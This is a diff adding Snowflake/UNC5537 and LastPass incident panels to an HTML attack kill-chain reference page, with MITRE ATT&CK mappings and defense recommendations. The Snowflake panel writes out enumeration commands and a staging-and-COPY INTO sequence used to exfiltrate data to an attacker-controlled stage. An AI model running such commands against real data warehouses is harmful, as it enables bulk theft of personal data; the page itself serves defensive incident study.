@@ -114,6 +114,8 @@
   <button class="itab" data-panel="mitnick-novell" data-year="1994" role="tab">Mitnick / Novell 1994 <span class="itab-prov prov-purple">On-Prem</span></button>
   <button class="itab" data-panel="scattered-spider" data-year="2023" role="tab">Scattered Spider / MGM 2023 <span class="itab-prov prov-azure">Okta · Azure</span></button>
   <button class="itab" data-panel="promptware-2024" data-year="2024" role="tab">Promptware Kill Chain 2024–26 <span class="itab-prov prov-green">AI · Cloud</span></button>
+  <button class="itab" data-panel="snowflake-2024" data-year="2024" role="tab">Snowflake / UNC5537 2024 <span class="itab-prov prov-aws">Snowflake</span></button>
+  <button class="itab" data-panel="lastpass-2022" data-year="2022" role="tab">LastPass 2022–23 <span class="itab-prov prov-aws">AWS S3</span></button>
 </nav>
 
 <main class="kc-main kc-page" id="main-content">
@@ -1492,6 +1494,298 @@
         <a class="src-link" href="https://embracethered.com/blog/posts/2025/spaiware-and-chatgpt-command-and-control-via-prompt-injection-zombai/" target="_blank" rel="noopener">Embrace The Red — ZombAI</a>
         <a class="src-link" href="https://www.varonis.com/blog/reprompt" target="_blank" rel="noopener">Varonis — Reprompt</a>
         <a class="src-link" href="https://blackhat.com/html/webcast/02262026.html" target="_blank" rel="noopener">Black Hat Webinar</a>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════ SNOWFLAKE / UNC5537 2024 ═══════════════ -->
+<div id="snowflake-2024" class="incident-panel" role="tabpanel">
+  <div class="inc-header">
+    <div class="inc-meta">
+      <span class="inc-year">April–June 2024</span>
+      <span class="sev-badge sev-critical">Critical</span>
+      <span class="prov-tag" style="background:rgba(34,197,94,.15);color:#4ade80;">Snowflake</span>
+    </div>
+    <h2 class="inc-title">UNC5537 / Snowflake – Infostealer Creds → No MFA → SHOW TABLES → Bulk Exfil → 100+ Orgs Extorted</h2>
+    <p class="inc-summary">A financially motivated threat actor tracked as UNC5537 spent months harvesting Snowflake credentials from infostealer malware logs, then systematically logged into victim Snowflake tenants — none of which required MFA — and exfiltrated large datasets. Over 100 organisations were hit including Ticketmaster (560M records), AT&T (73M records), and Santander Bank. Snowflake itself was not breached; the attack was entirely predicated on absent MFA and reused credentials.</p>
+    <div class="inc-stats">
+      <div class="inc-stat"><strong>100+</strong> organisations compromised</div>
+      <div class="inc-stat"><strong>560M</strong> Ticketmaster records</div>
+      <div class="inc-stat"><strong>73M</strong> AT&amp;T records</div>
+      <div class="inc-stat"><strong>Threat actor:</strong> UNC5537 (financially motivated, extortion-focused)</div>
+    </div>
+    <a class="pm-link" href="https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion" target="_blank" rel="noopener">📄 Mandiant / Google — UNC5537 report ↗</a>
+    <a class="pm-link" href="https://www.snowflake.com/en/blog/detecting-preventing-unauthorized-user-access/" target="_blank" rel="noopener">📄 Snowflake security advisory ↗</a>
+  </div>
+  <div class="kill-chain">
+
+    <div class="phase-lbl ph-recon">🕵️ Initial Credential Acquisition — Infostealer Logs</div>
+    <div class="kc-step step-r">
+      <div class="step-num">01</div>
+      <div class="step-body">
+        <div class="step-hdr">
+          <div class="step-title">Snowflake credentials harvested from infostealer malware logs collected over months</div>
+          <a class="mt mt-ca" href="https://attack.mitre.org/techniques/T1555/003/" target="_blank" rel="noopener">T1555.003 – Credentials from Web Browsers</a>
+        </div>
+        <p class="step-desc">UNC5537 sourced valid Snowflake credentials from infostealer malware logs — RedLine, Vidar, and Lumma stealer families had infected contractor and employee devices, exfiltrating saved browser credentials including Snowflake login URLs. The logs were purchased from underground markets or obtained from prior campaigns. Mandiant confirmed some credentials were years old and still valid because passwords had never been rotated.</p>
+        <div class="step-code">
+          <span class="hl">Malware families:</span> RedLine Stealer, Vidar, Lumma — browser credential dumpers<br>
+          <span class="hl">Credential age:</span> Some logs dated years prior to the campaign — passwords never rotated<br>
+          <span class="hl">Why it worked:</span> No Snowflake-side MFA requirement · No network policy allowlisting · No anomalous-login alerting
+        </div>
+        <div class="step-tags"><span class="stag">Infostealer</span><span class="stag">RedLine</span><span class="stag">Credential Harvesting</span><span class="stag">T1555.003</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl ph-init">⚡ Initial Access — Valid Credentials, No MFA</div>
+    <div class="kc-step step-r">
+      <div class="step-num">02</div>
+      <div class="step-body">
+        <div class="step-hdr">
+          <div class="step-title">Attacker authenticated directly to victim Snowflake tenants — no MFA challenge</div>
+          <a class="mt mt-ta" href="https://attack.mitre.org/techniques/T1078/004/" target="_blank" rel="noopener">T1078.004 – Cloud Accounts</a>
+        </div>
+        <p class="step-desc">Using the harvested credentials, UNC5537 authenticated to each victim's Snowflake instance. Snowflake did not enforce MFA by default at the time — it was available but opt-in. None of the compromised accounts had MFA enabled, and no network policy restricted which IPs could connect to the tenants. The attacker connected using the SnowSQL CLI and the Snowflake JDBC driver to automate credential testing at scale.</p>
+        <div class="step-code">
+          <span class="hl">Tools used:</span> SnowSQL CLI, Snowflake JDBC driver, custom automation scripts<br>
+          <span class="hl">MFA status:</span> Not enforced — opt-in at account level, not mandated by Snowflake platform policy<br>
+          <span class="hl">Network policy:</span> No IP allowlist configured on any of the affected tenants<br>
+          <span class="hl">Detection gap:</span> Logins from new IPs/countries generated no alert to account owners
+        </div>
+        <div class="step-tags"><span class="stag">No MFA</span><span class="stag">SnowSQL</span><span class="stag">JDBC</span><span class="stag">T1078.004</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl ph-disco">🔍 Discovery — Warehouse Enumeration</div>
+    <div class="kc-step step-o">
+      <div class="step-num">03</div>
+      <div class="step-body">
+        <div class="step-hdr">
+          <div class="step-title">SHOW DATABASES / SHOW SCHEMAS / SHOW TABLES used to map all accessible data</div>
+          <a class="mt mt-di" href="https://attack.mitre.org/techniques/T1619/" target="_blank" rel="noopener">T1619 – Cloud Storage Object Discovery</a>
+        </div>
+        <p class="step-desc">Once authenticated, UNC5537 ran Snowflake's native enumeration commands to identify all databases, schemas, and tables accessible to the compromised user. The commands are native SQL — no exploitation required. Because the accounts were often service accounts or analyst accounts with broad SELECT permissions, the full data landscape of the tenant was visible in seconds.</p>
+        <div class="step-code">
+          <span class="hl">Commands:</span> SHOW DATABASES; SHOW SCHEMAS IN DATABASE x; SHOW TABLES IN SCHEMA x.y;<br>
+          <span class="hl">Also used:</span> SELECT * FROM INFORMATION_SCHEMA.TABLES to enumerate accessible objects<br>
+          <span class="hl">Typical finding:</span> PII tables — customer names, emails, phone numbers, payment card data, SSNs
+        </div>
+        <div class="step-tags"><span class="stag">SHOW TABLES</span><span class="stag">INFORMATION_SCHEMA</span><span class="stag">SQL Enumeration</span><span class="stag">T1619</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl ph-exfil">📤 Exfiltration — Staged and Extracted</div>
+    <div class="kc-step step-c">
+      <div class="step-num">04</div>
+      <div class="step-body">
+        <div class="step-hdr">
+          <div class="step-title">Data staged with CREATE TABLE AS SELECT then exfiltrated via COPY INTO external stage</div>
+          <a class="mt mt-ef" href="https://attack.mitre.org/techniques/T1530/" target="_blank" rel="noopener">T1530 – Data from Cloud Storage</a>
+        </div>
+        <p class="step-desc">UNC5537 used standard Snowflake SQL to stage target data into temporary tables, then exported it via COPY INTO to an external stage (attacker-controlled S3 bucket or Azure Blob) or downloaded it directly via GET. Large datasets like Ticketmaster's 560M-row table were extracted over multiple sessions. Snowflake's query history log retained these commands, providing forensic visibility after the fact — but no real-time alerting fired during exfiltration.</p>
+        <div class="step-code">
+          <span class="hl">Stage 1 — staging:</span> CREATE TABLE attacker_export AS SELECT * FROM customers;<br>
+          <span class="hl">Stage 2 — export:</span> COPY INTO @external_stage/dump.csv.gz FROM attacker_export;<br>
+          <span class="hl">Scale (Ticketmaster):</span> 560M records, 1.3TB — sold on BreachForums for $500,000<br>
+          <span class="hl">Detection gap:</span> No DLP on Snowflake COPY INTO · No alert on large external stage writes
+        </div>
+        <div class="step-tags"><span class="stag">COPY INTO</span><span class="stag">External Stage</span><span class="stag">T1530</span><span class="stag">560M Records</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl ph-impact">💰 Actions on Objective — Extortion</div>
+    <div class="kc-step step-p">
+      <div class="step-num">05</div>
+      <div class="step-body">
+        <div class="step-hdr">
+          <div class="step-title">Victims contacted with data samples — ransom demanded, data sold on BreachForums when unpaid</div>
+          <a class="mt mt-p2" href="https://attack.mitre.org/techniques/T1657/" target="_blank" rel="noopener">T1657 – Financial Theft</a>
+        </div>
+        <p class="step-desc">After exfiltration, UNC5537 contacted victims directly with samples of stolen data as proof, demanding payment for deletion. When victims did not pay, datasets were listed for sale on BreachForums. The Ticketmaster database was offered for $500,000; AT&T data was listed separately. Mandiant assessed UNC5537 had at least one member residing in North America and coordinated with a partner in Turkey.</p>
+        <div class="step-code">
+          <span class="hl">Extortion method:</span> Direct contact to victims with data samples, ransom demand<br>
+          <span class="hl">BreachForums listing:</span> Ticketmaster — 560M records, $500,000 · AT&amp;T — 73M records<br>
+          <span class="hl">Actor attribution:</span> UNC5537 — financially motivated, some members in North America and Turkey
+        </div>
+        <div class="step-tags"><span class="stag">Extortion</span><span class="stag">BreachForums</span><span class="stag">UNC5537</span><span class="stag">T1657</span></div>
+      </div>
+    </div>
+
+    <div class="def-box">
+      <h3>🛡 How to Defend Against This Chain</h3>
+      <div class="def-items">
+        <div class="def-item"><strong>Enforce MFA on all Snowflake accounts — especially service accounts.</strong> Snowflake now supports mandatory MFA policies at the account level. Enable it. This single control would have stopped the entire campaign — every victim account was compromised solely because valid credentials plus no MFA was sufficient to authenticate.</div>
+        <div class="def-item"><strong>Configure Snowflake network policies to allowlist known source IPs.</strong> Snowflake NETWORK POLICY objects restrict which IP ranges can connect to a tenant. Lock production Snowflake access to your corporate egress IPs, VPN ranges, and known analytics tool IPs. A login from a residential or VPS IP should be impossible.</div>
+        <div class="def-item"><strong>Monitor Snowflake QUERY_HISTORY for COPY INTO external stage operations.</strong> Any COPY INTO pointing at an external stage that isn't a known data pipeline target should trigger an immediate alert. Enable Snowflake's Access History and query the QUERY_HISTORY view in your SIEM. This is the single most reliable detection signal for this attack pattern.</div>
+        <div class="def-item"><strong>Apply least-privilege Snowflake roles.</strong> Analyst accounts and service accounts should have READ access only to the specific schemas they need — not SELECT * on the entire data warehouse. Use Snowflake's role hierarchy and avoid granting ACCOUNTADMIN to any account used by applications or individual analysts.</div>
+        <div class="def-item"><strong>Subscribe to credential-exposure monitoring services.</strong> Infostealer logs containing your organisation's credentials appear on underground markets before attacks. Services like SpyCloud, Hudson Rock, or Flare detect your credentials in infostealer logs. Integrate alerts to trigger forced password resets and MFA re-enrolment.</div>
+      </div>
+    </div>
+
+    <div class="src-box">
+      <h4>Primary Sources</h4>
+      <div class="src-links">
+        <a class="src-link" href="https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion" target="_blank" rel="noopener">Mandiant — UNC5537 Report</a>
+        <a class="src-link" href="https://www.snowflake.com/en/blog/detecting-preventing-unauthorized-user-access/" target="_blank" rel="noopener">Snowflake Security Advisory</a>
+        <a class="src-link" href="https://attack.mitre.org/techniques/T1078/004/" target="_blank" rel="noopener">MITRE T1078.004</a>
+        <a class="src-link" href="https://attack.mitre.org/techniques/T1530/" target="_blank" rel="noopener">MITRE T1530</a>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════ LASTPASS 2022–2023 ═══════════════ -->
+<div id="lastpass-2022" class="incident-panel" role="tabpanel">
+  <div class="inc-header">
+    <div class="inc-meta">
+      <span class="inc-year">Aug 2022 – Jan 2023</span>
+      <span class="sev-badge sev-critical">Critical</span>
+      <span class="prov-tag prov-aws">AWS S3</span>
+    </div>
+    <h2 class="inc-title">LastPass – Dev Env Breach → Source Code Recon → DevOps Home PC (Plex Exploit) → Keylogger → AWS S3 Vault Backup Exfil</h2>
+    <p class="inc-summary">A two-stage attack first compromised LastPass's development environment, then used the stolen technical knowledge to target a specific DevOps engineer — one of only four people with access to production decryption keys. The attacker exploited a years-old unpatched vulnerability in Plex Media Server on the engineer's personal home computer to install a keylogger, captured the master password, unlocked the engineer's personal LastPass vault, and used the cloud credentials inside to exfiltrate encrypted customer vault backups from AWS S3. The entire chain required no zero-days in LastPass's production infrastructure.</p>
+    <div class="inc-stats">
+      <div class="inc-stat"><strong>33M</strong> customers notified</div>
+      <div class="inc-stat"><strong>Encrypted vaults</strong> of all customers exfiltrated</div>
+      <div class="inc-stat"><strong>2 stages</strong> across 5 months</div>
+      <div class="inc-stat"><strong>Threat actor:</strong> Sophisticated, likely financially motivated or state-adjacent</div>
+    </div>
+    <a class="pm-link" href="https://blog.lastpass.com/posts/2023/03/security-incident-update-recommended-actions" target="_blank" rel="noopener">📄 LastPass March 2023 disclosure ↗</a>
+    <a class="pm-link" href="https://support.lastpass.com/s/document-item?language=en_US&bundleId=lastpass&topicId=LastPassArticleDetail&urlName=incident-2-details" target="_blank" rel="noopener">📄 LastPass Incident 2 technical detail ↗</a>
+  </div>
+  <div class="kill-chain">
+
+    <div class="phase-lbl ph-init">⚡ Stage 1 — Development Environment Breach (August 2022)</div>
+    <div class="kc-step step-r">
+      <div class="step-num">01</div>
+      <div class="step-body">
+        <div class="step-hdr">
+          <div class="step-title">Developer endpoint compromised — source code, technical documentation, and build secrets exfiltrated</div>
+          <a class="mt mt-ta" href="https://attack.mitre.org/techniques/T1195/002/" target="_blank" rel="noopener">T1195.002 – Compromise Software Supply Chain</a>
+        </div>
+        <p class="step-desc">A LastPass software developer's endpoint was compromised via a third-party software package. The attacker used this foothold to access the developer's credentials and the shared development environment, exfiltrating source code, technical documentation, internal secrets, and some customer metadata. LastPass disclosed this breach in August 2022, describing it as a development environment incident with no customer data or vault content accessed. What wasn't known at the time: the stolen technical documentation would be used to plan Stage 2.</p>
+        <div class="step-code">
+          <span class="hl">Exfiltrated in Stage 1:</span> Source code repositories, internal technical documentation, build environment secrets<br>
+          <span class="hl">Customer impact at Stage 1:</span> None disclosed — no production access, no vault data<br>
+          <span class="hl">Strategic value to attacker:</span> Infrastructure topology, S3 bucket names, backup key architecture, target identity (DevOps engineer)
+        </div>
+        <div class="step-tags"><span class="stag">Dev Environment</span><span class="stag">Source Code</span><span class="stag">T1195.002</span><span class="stag">Stage 1</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl ph-recon">🔍 Reconnaissance — Target Selection from Stolen Docs</div>
+    <div class="kc-step step-o">
+      <div class="step-num">02</div>
+      <div class="step-body">
+        <div class="step-hdr">
+          <div class="step-title">Stolen technical documentation used to identify the four DevOps engineers with production backup key access</div>
+          <a class="mt mt-ta" href="https://attack.mitre.org/techniques/T1591/" target="_blank" rel="noopener">T1591 – Gather Victim Org Information</a>
+        </div>
+        <p class="step-desc">Using the documentation stolen in Stage 1, the attacker understood exactly how LastPass's production backup encryption worked: a small set of DevOps engineers held decryption keys for the production S3 backup environment. Only four employees had access. The attacker identified one of these four as the target for Stage 2 — choosing home infrastructure as the attack surface because personal endpoints are outside corporate MDM and EDR coverage.</p>
+        <div class="step-code">
+          <span class="hl">Target profile:</span> DevOps engineer — one of four employees with access to production backup decryption keys<br>
+          <span class="hl">Attack surface chosen:</span> Personal home computer — outside corporate MDM, EDR, and monitoring<br>
+          <span class="hl">Intelligence source:</span> Stage 1 stolen technical documentation and internal runbooks
+        </div>
+        <div class="step-tags"><span class="stag">Target Selection</span><span class="stag">OSINT</span><span class="stag">Home PC Vector</span><span class="stag">T1591</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl ph-exec">💥 Stage 2 — Home Computer Exploitation (November 2022)</div>
+    <div class="kc-step step-p">
+      <div class="step-num">03</div>
+      <div class="step-body">
+        <div class="step-hdr">
+          <div class="step-title">Unpatched Plex Media Server vulnerability exploited on DevOps engineer's home PC — remote code execution</div>
+          <a class="mt mt-ex" href="https://attack.mitre.org/techniques/T1203/" target="_blank" rel="noopener">T1203 – Exploitation for Client Execution</a>
+        </div>
+        <p class="step-desc">The targeted DevOps engineer ran Plex Media Server on their personal home computer. The attacker exploited a known vulnerability in Plex that had been publicly disclosed years prior and had a patch available — but the engineer's home installation was unpatched. Plex itself disclosed separately that it had been notified of this exploitation and confirmed the CVE was over two years old with a patch available. The exploit provided remote code execution on the home machine.</p>
+        <div class="step-code">
+          <span class="hl">Vulnerable software:</span> Plex Media Server — personal home installation, unpatched<br>
+          <span class="hl">Vulnerability age:</span> Over 2 years old with patch available at time of exploitation<br>
+          <span class="hl">Attack surface:</span> Personal home computer — no corporate EDR, no MDM, no monitoring<br>
+          <span class="hl">Result:</span> Remote code execution on the DevOps engineer's home machine
+        </div>
+        <div class="step-tags"><span class="stag">Plex Exploit</span><span class="stag">Unpatched Home PC</span><span class="stag">RCE</span><span class="stag">T1203</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl ph-cred">🔑 Keylogger → Master Password Capture</div>
+    <div class="kc-step step-y">
+      <div class="step-num">04</div>
+      <div class="step-body">
+        <div class="step-hdr">
+          <div class="step-title">Keylogger installed on home PC — DevOps engineer's LastPass master password captured</div>
+          <a class="mt mt-ca" href="https://attack.mitre.org/techniques/T1056/001/" target="_blank" rel="noopener">T1056.001 – Keylogging</a>
+        </div>
+        <p class="step-desc">Using the RCE foothold, the attacker installed a keylogger on the DevOps engineer's home PC. When the engineer next unlocked their personal LastPass vault, the master password was captured in plaintext. LastPass confirmed the keylogger captured the master password while the MFA was bypassed — the engineer's vault was on a personal device where MFA state was already trusted, meaning only the master password was needed to decrypt the local vault.</p>
+        <div class="step-code">
+          <span class="hl">Technique:</span> Keylogger capturing master password at vault unlock<br>
+          <span class="hl">MFA bypass:</span> Personal device was a trusted device — MFA not re-prompted at each vault unlock<br>
+          <span class="hl">What was captured:</span> Master password for the DevOps engineer's personal LastPass vault
+        </div>
+        <div class="step-tags"><span class="stag">Keylogger</span><span class="stag">Master Password</span><span class="stag">T1056.001</span><span class="stag">Trusted Device Bypass</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl ph-priv">🔓 Vault Decryption → AWS Credential Extraction</div>
+    <div class="kc-step step-p">
+      <div class="step-num">05</div>
+      <div class="step-body">
+        <div class="step-hdr">
+          <div class="step-title">Engineer's LastPass vault decrypted — AWS S3 production backup credentials and decryption keys extracted</div>
+          <a class="mt mt-ca" href="https://attack.mitre.org/techniques/T1555/" target="_blank" rel="noopener">T1555 – Credentials from Password Stores</a>
+        </div>
+        <p class="step-desc">The attacker used the captured master password to decrypt the DevOps engineer's LastPass vault. Inside were the credentials the engineer used day-to-day: AWS IAM access keys, cloud infrastructure credentials, and the decryption keys for the LastPass production backup environment stored in S3. The vault effectively contained the keys to the kingdom — by targeting the one person whose vault was both accessible from a personal device and contained production credentials, the attacker bypassed all of LastPass's production security controls in a single step.</p>
+        <div class="step-code">
+          <span class="hl">Vault contents obtained:</span> AWS IAM credentials · S3 backup bucket access keys · Production decryption keys · MFA seeds<br>
+          <span class="hl">Irony:</span> A password manager's own vault was the attack vector against its production infrastructure<br>
+          <span class="hl">Architectural failure:</span> Production credentials stored in a personal vault on an unmanaged device
+        </div>
+        <div class="step-tags"><span class="stag">Vault Decryption</span><span class="stag">AWS Keys</span><span class="stag">T1555</span><span class="stag">Production Credentials</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl ph-exfil">📤 Exfiltration — Customer Vault Backups from AWS S3</div>
+    <div class="kc-step step-c">
+      <div class="step-num">06</div>
+      <div class="step-body">
+        <div class="step-hdr">
+          <div class="step-title">Encrypted customer vault backups exfiltrated from AWS S3 — 33M customers affected</div>
+          <a class="mt mt-ef" href="https://attack.mitre.org/techniques/T1530/" target="_blank" rel="noopener">T1530 – Data from Cloud Storage</a>
+        </div>
+        <p class="step-desc">Using the AWS credentials from the decrypted vault, the attacker accessed LastPass's production S3 backup buckets and exfiltrated a copy of all encrypted customer vault backups. The backup files also contained unencrypted metadata: website URLs, usernames, billing information, IP addresses, and MFA seeds for some accounts. The encrypted vault data itself is protected by each customer's master password — but weak master passwords remain vulnerable to offline brute-force attacks against the exfiltrated data.</p>
+        <div class="step-code">
+          <span class="hl">Data exfiltrated:</span> Encrypted customer password vaults (AES-256 PBKDF2) for 33M customers<br>
+          <span class="hl">Unencrypted metadata also taken:</span> Website URLs, usernames, billing data, IP history, MFA seeds<br>
+          <span class="hl">Ongoing risk:</span> Offline brute-force attacks against encrypted vaults using weak master passwords<br>
+          <span class="hl">Also taken:</span> API integration secrets, multi-factor authentication seeds, customer keys
+        </div>
+        <div class="step-tags"><span class="stag">S3 Exfil</span><span class="stag">Encrypted Vaults</span><span class="stag">33M Customers</span><span class="stag">T1530</span></div>
+      </div>
+    </div>
+
+    <div class="def-box">
+      <h3>🛡 How to Defend Against This Chain</h3>
+      <div class="def-items">
+        <div class="def-item"><strong>Never store production credentials in personal vaults on unmanaged devices.</strong> Production AWS keys, infrastructure credentials, and decryption keys must live in corporate-managed secrets stores (AWS Secrets Manager, HashiCorp Vault) accessed only from managed, MDM-enrolled, EDR-monitored devices. A personal laptop running home media software is not an appropriate platform for production credential access.</div>
+        <div class="def-item"><strong>Apply patch management to home machines used for work — or prohibit personal device production access entirely.</strong> The Plex vulnerability was over two years old with a patch available. If employees access production systems from home machines, those machines must meet a minimum security baseline: OS patches current, no unnecessary server software, corporate EDR installed. Better still: use a dedicated corporate-issued workstation for production access.</div>
+        <div class="def-item"><strong>Segment production access behind hardware MFA that doesn't trust device state.</strong> Require a fresh FIDO2 hardware key challenge for every production credential retrieval — regardless of whether the device is "trusted." This would have broken the chain at Step 4: even with the master password, the attacker would have needed the physical hardware key.</div>
+        <div class="def-item"><strong>Limit the blast radius of any single employee's credential access.</strong> Only four employees needed production backup key access. For each, access should require dual authorisation (two-person integrity), be time-limited with break-glass logging, and use separate credentials that cannot be stored alongside day-to-day vault contents.</div>
+        <div class="def-item"><strong>Alert on anomalous S3 access patterns from production credential use.</strong> An AWS access key that normally accesses a small set of S3 paths should trigger an alert if it suddenly issues GetObject calls across entire bucket prefixes. GuardDuty's S3 anomaly detection and CloudTrail + SIEM rules can catch bulk exfiltration even when credentials are legitimate.</div>
+      </div>
+    </div>
+
+    <div class="src-box">
+      <h4>Primary Sources</h4>
+      <div class="src-links">
+        <a class="src-link" href="https://blog.lastpass.com/posts/2023/03/security-incident-update-recommended-actions" target="_blank" rel="noopener">LastPass March 2023 Disclosure</a>
+        <a class="src-link" href="https://support.lastpass.com/s/document-item?language=en_US&bundleId=lastpass&topicId=LastPassArticleDetail&urlName=incident-2-details" target="_blank" rel="noopener">LastPass Incident 2 Detail</a>
+        <a class="src-link" href="https://attack.mitre.org/techniques/T1056/001/" target="_blank" rel="noopener">MITRE T1056.001</a>
+        <a class="src-link" href="https://attack.mitre.org/techniques/T1530/" target="_blank" rel="noopener">MITRE T1530</a>
       </div>
     </div>
 
